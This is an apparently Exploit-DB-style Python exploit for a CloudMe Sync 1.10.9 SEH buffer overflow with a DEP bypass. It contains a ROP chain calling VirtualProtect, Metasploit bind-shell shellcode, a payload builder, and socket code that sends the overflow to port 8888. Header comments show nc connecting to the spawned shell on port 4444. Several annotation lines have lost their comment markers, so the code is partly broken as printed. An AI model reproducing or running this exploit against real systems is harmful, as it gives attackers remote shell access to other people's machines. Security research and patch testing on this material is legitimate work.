# Exploit: CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)
# Date: 2018-05-27
# Author: Juan Prescotto
# Tested Against: Win7 Pro SP1 64 bit
# Software Download: https://www.cloudme.com/downloads/CloudMe_1109.exe
# Tested Against Version: 1.10.9
# Special Thanks to my wife for allowing me spend countless hours on this passion of mine
# Credit: Thanks to John Page (aka hyp3rlinx) (https://www.exploit-db.com/exploits/44027/)
# for his work on the original exploit

# Bad Characers: \x00
# SEH Offset: 2236
# Non-Participating Modules Used: Qt5Gui.dll, Qt5Core.dll,libstdc++-6.dll, libgcc_s_dw2-1.dll, libwinpthread-1.dll

# Victim Machine:
# C:\>netstat -nao | find "8888"
# TCP  0.0.0.0:8888  0.0.0.0:0 LISTENING 2640
# C:\>tasklist | find "2640"
# CloudMe.exe  2640 Console  1 36,632 K

# Attacking Machine:
# root@kali:~/Desktop# python cloudme.py
# CloudMe Sync v1.10.9 Buffer Overflow with DEP Bypass
# [+] CloudMe Target IP> 192.168.12.4
# Sending buffer overflow to CloudMe Service
# Target Should be Running a Bind Shell on Port 4444!

# root@kali:~/Desktop# nc -nv 192.168.12.4 4444
# (UNKNOWN) [192.168.12.4] 4444 (?) open
# Microsoft Windows [Version 6.1.7601]
# Copyright (c) 2009 Microsoft Corporation. All rights reserved.

# C:\Users\jprescotto\AppData\Local\Programs\CloudMe\CloudMe>
# My register setup when VirtualProtect() is called (Defeat DEP) :
             --
# EAX = NOP (0x90909090)
# ECX = lpOldProtect (ptr to W address)
# EDX = NewProtect (0x40)
# EBX = dwSize
# ESP = lPAddress (automatic)
# EBP = ReturnTo (ptr to jmp esp)
# ESI = ptr to VirtualProtect()
# EDI = ROP NOP (RETN)

#!/usr/bin/python

import socket,struct

print 'CloudMe Sync v1.10.9 Buffer Overflow with DEP Bypass'

def create_rop_chain():

  rop chain generated with mona.py - www.corelan.be
  rop_gadgets = [
  0x61d1e7fe,  POP ECX  RETN [Qt5Gui.dll]
  0x690398a8,  ptr to &VirtualProtect() [IAT Qt5Core.dll]
  0x6fe70610,  MOV EAX,DWORD PTR DS:[ECX]  RETN [libstdc++-6.dll]
  0x61c40a6f,  XCHG EAX,ESI  RETN [Qt5Gui.dll]
  0x68c8ea5a,  POP EBP  RETN [Qt5Core.dll]
  0x68d652e1,  & call esp [Qt5Core.dll]
  0x68fa7ca2,  POP EDX  RETN [Qt5Core.dll]
  0xfffffdff,  Value to negate, will become 0x00000201
  0x6eb47092,  NEG EDX  RETN [libgcc_s_dw2-1.dll]
  0x68d52747,  POP EBX  RETN [Qt5Core.dll]
  0xffffffff,
  0x68f948bc,  INC EBX  RETN [Qt5Core.dll]
  0x68f8063c,  ADD EBX,EDX  ADD AL,0A  RETN [Qt5Core.dll]
  0x68f9a472,  POP EDX  RETN [Qt5Core.dll]
  0xffffffc0,  Value to negate, will become 0x00000040
  0x6eb47092,  NEG EDX  RETN [libgcc_s_dw2-1.dll]
  0x61f057ab,  POP ECX  RETN [Qt5Gui.dll]
  0x6eb5efa3,  &Writable location [libgcc_s_dw2-1.dll]
  0x61dc14d1,  POP EDI  RETN [Qt5Gui.dll]
  0x64b4ed0c,  RETN (ROP NOP) [libwinpthread-1.dll]
  0x61ba6245,  POP EAX  RETN [Qt5Gui.dll]
  0x90909090,  nop
  0x61b45ea3,  PUSHAD  RETN [Qt5Gui.dll]
  ]
  return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()



#msf payload(shell_bind_tcp) > show options
#Module options (payload/windows/shell_bind_tcp):
# Name  Current Setting  Required  Description
# EXITFUNC  thread  yes Exit technique (Accepted: '', seh, thread, process, none)
# LPORT 4444  yes The listen port
# RHOST  no The target address
#msf payload(shell_bind_tcp) > generate -b '\x00' -t py
# windows/shell_bind_tcp - 355 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai

shellcode =  ""
shellcode += "\xda\xcf\xba\x8c\x90\x7b\x70\xd9\x74\x24\xf4\x5e\x33"
shellcode += "\xc9\xb1\x53\x31\x56\x17\x83\xee\xfc\x03\xda\x83\x99"
shellcode += "\x85\x1e\x4b\xdf\x66\xde\x8c\x80\xef\x3b\xbd\x80\x94"
shellcode += "\x48\xee\x30\xde\x1c\x03\xba\xb2\xb4\x90\xce\x1a\xbb"
shellcode += "\x11\x64\x7d\xf2\xa2\xd5\xbd\x95\x20\x24\x92\x75\x18"
shellcode += "\xe7\xe7\x74\x5d\x1a\x05\x24\x36\x50\xb8\xd8\x33\x2c"
shellcode += "\x01\x53\x0f\xa0\x01\x80\xd8\xc3\x20\x17\x52\x9a\xe2"
shellcode += "\x96\xb7\x96\xaa\x80\xd4\x93\x65\x3b\x2e\x6f\x74\xed"
shellcode += "\x7e\x90\xdb\xd0\x4e\x63\x25\x15\x68\x9c\x50\x6f\x8a"
shellcode += "\x21\x63\xb4\xf0\xfd\xe6\x2e\x52\x75\x50\x8a\x62\x5a"
shellcode += "\x07\x59\x68\x17\x43\x05\x6d\xa6\x80\x3e\x89\x23\x27"
shellcode += "\x90\x1b\x77\x0c\x34\x47\x23\x2d\x6d\x2d\x82\x52\x6d"
shellcode += "\x8e\x7b\xf7\xe6\x23\x6f\x8a\xa5\x2b\x5c\xa7\x55\xac"
shellcode += "\xca\xb0\x26\x9e\x55\x6b\xa0\x92\x1e\xb5\x37\xd4\x34"
shellcode += "\x01\xa7\x2b\xb7\x72\xee\xef\xe3\x22\x98\xc6\x8b\xa8"
shellcode += "\x58\xe6\x59\x44\x50\x41\x32\x7b\x9d\x31\xe2\x3b\x0d"
shellcode += "\xda\xe8\xb3\x72\xfa\x12\x1e\x1b\x93\xee\xa1\x32\x38"
shellcode += "\x66\x47\x5e\xd0\x2e\xdf\xf6\x12\x15\xe8\x61\x6c\x7f"
shellcode += "\x40\x05\x25\x69\x57\x2a\xb6\xbf\xff\xbc\x3d\xac\x3b"
shellcode += "\xdd\x41\xf9\x6b\x8a\xd6\x77\xfa\xf9\x47\x87\xd7\x69"
shellcode += "\xeb\x1a\xbc\x69\x62\x07\x6b\x3e\x23\xf9\x62\xaa\xd9"
shellcode += "\xa0\xdc\xc8\x23\x34\x26\x48\xf8\x85\xa9\x51\x8d\xb2"
shellcode += "\x8d\x41\x4b\x3a\x8a\x35\x03\x6d\x44\xe3\xe5\xc7\x26"
shellcode += "\x5d\xbc\xb4\xe0\x09\x39\xf7\x32\x4f\x46\xd2\xc4\xaf"
shellcode += "\xf7\x8b\x90\xd0\x38\x5c\x15\xa9\x24\xfc\xda\x60\xed"
shellcode += "\x1c\x39\xa0\x18\xb5\xe4\x21\xa1\xd8\x16\x9c\xe6\xe4"
shellcode += "\x94\x14\x97\x12\x84\x5d\x92\x5f\x02\x8e\xee\xf0\xe7"
shellcode += "\xb0\x5d\xf0\x2d"

ip=raw_input('[+] CloudMe Target IP> ')

stack_pivot=struct.pack('<L',0x61d95f58) {pivot 3492 / 0xda4} (Lands us into rop nop chain --> rop_chain) :  SUB ESP,8  ADD ESP,0D8C  POP EBX  POP ESI  POP EDI  POP EBP  RETN 0x08  ** [Qt5Gui.dll] ** | {PAGE_EXECUTE_READ}
rop_nop1=struct.pack('<L',0x68b1a714) * 300  RETN 0x10  ** [Qt5Core.dll] ** | {PAGE_EXECUTE_READ}
rop_nop2=struct.pack('<L',0x61c6fc53) * 50  RETN  ** [Qt5Gui.dll] ** | {PAGE_EXECUTE_READ}
nop = "\x90" * 20

payload = "A" * 2236 + stack_pivot + rop_nop1 + rop_nop2 + rop_chain + nop + shellcode + "B"*(5600-len(rop_nop1)-len(rop_nop2)-len(rop_chain)-len(nop)-len(shellcode))


s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,8888))
s.send(payload)
print 'Sending buffer overflow to CloudMe Service'
print 'Target Should be Running a Bind Shell on Port 4444!'